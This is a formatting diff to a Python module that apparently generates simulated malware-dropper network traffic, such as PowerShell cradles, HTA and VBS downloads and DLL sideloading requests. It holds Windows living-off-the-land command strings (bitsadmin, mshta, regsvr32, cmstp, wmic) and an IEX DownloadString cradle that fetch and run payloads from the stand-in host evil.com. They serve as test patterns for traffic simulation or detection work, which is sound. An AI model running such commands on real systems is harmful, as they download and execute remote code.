@@ -25,10 +25,10 @@ LOLBIN_PATTERNS = [
     "bitsadmin /transfer myJob /download http://evil.com/mal.exe C:\\temp\\mal.exe",
     "mshta http://evil.com/payload.hta",
     "regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll",
-    "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();",
+    'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";document.write();',
     "cmstp /ni /s http://evil.com/mal.inf",
-    "wmic process call create \"cmd /c http://evil.com/payload\"",
-    "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"cmd /c calc.exe\"",
+    'wmic process call create "cmd /c http://evil.com/payload"',
+    'forfiles /p c:\\windows\\system32 /m notepad.exe /c "cmd /c calc.exe"',
 ]
 
 # VBS/HTA dropper patterns
@@ -72,14 +72,13 @@ class DropperModule(TrafficModule):
             ports=[80, 443, 8080],
         )
 
-    def _generate_powershell_cradle(
-        self, src_ip: str, dst_ip: str, port: int
-    ) -> Iterator[Packet]:
+    def _generate_powershell_cradle(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
         """Generate PowerShell download cradle pattern."""
         cradle = random.choice(POWERSHELL_CRADLES)
 
         # URL-encoded cradle in GET parameter
         import urllib.parse
+
         encoded_cradle = urllib.parse.quote(cradle)
 
         http_request = (
@@ -97,9 +96,7 @@ class DropperModule(TrafficModule):
         )
         yield packet
 
-    def _generate_lolbin_download(
-        self, src_ip: str, dst_ip: str, port: int
-    ) -> Iterator[Packet]:
+    def _generate_lolbin_download(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
         """Generate LOLBin download pattern."""
         # Request that would be made by a LOLBin
         lolbin_paths = [
@@ -136,9 +133,7 @@ class DropperModule(TrafficModule):
         )
         yield packet
 
-    def _generate_hta_payload(
-        self, src_ip: str, dst_ip: str, port: int
-    ) -> Iterator[Packet]:
+    def _generate_hta_payload(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
         """Generate HTA file request."""
         http_request = (
             f"GET /update.hta HTTP/1.1\r\n"
@@ -155,9 +150,7 @@ class DropperModule(TrafficModule):
         )
         yield packet
 
-    def _generate_vbs_download(
-        self, src_ip: str, dst_ip: str, port: int
-    ) -> Iterator[Packet]:
+    def _generate_vbs_download(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
         """Generate VBScript download pattern."""
         http_request = (
             f"GET /script.vbs HTTP/1.1\r\n"
@@ -174,9 +167,7 @@ class DropperModule(TrafficModule):
         )
         yield packet
 
-    def _generate_macro_doc_download(
-        self, src_ip: str, dst_ip: str, port: int
-    ) -> Iterator[Packet]:
+    def _generate_macro_doc_download(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
         """Generate malicious document download pattern."""
         doc_names = [
             "invoice.doc",
@@ -203,9 +194,7 @@ class DropperModule(TrafficModule):
         )
         yield packet
 
-    def _generate_encoded_payload(
-        self, src_ip: str, dst_ip: str, port: int
-    ) -> Iterator[Packet]:
+    def _generate_encoded_payload(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
         """Generate base64 encoded payload request/response pattern."""
         # Simulated encoded payload in response body would look like this
         fake_ps = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com')"
@@ -227,9 +216,7 @@ class DropperModule(TrafficModule):
         )
         yield packet
 
-    def _generate_dll_sideload(
-        self, src_ip: str, dst_ip: str, port: int
-    ) -> Iterator[Packet]:
+    def _generate_dll_sideload(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
         """Generate DLL sideloading download pattern."""
         # Common DLL sideloading targets
         dll_names = [
@@ -323,4 +310,3 @@ class DropperModule(TrafficModule):
             yield from self._generate_dll_sideload(src_ip, dst_ip, port)
         else:
             yield from self._generate_office_template_injection(src_ip, dst_ip, port)
-
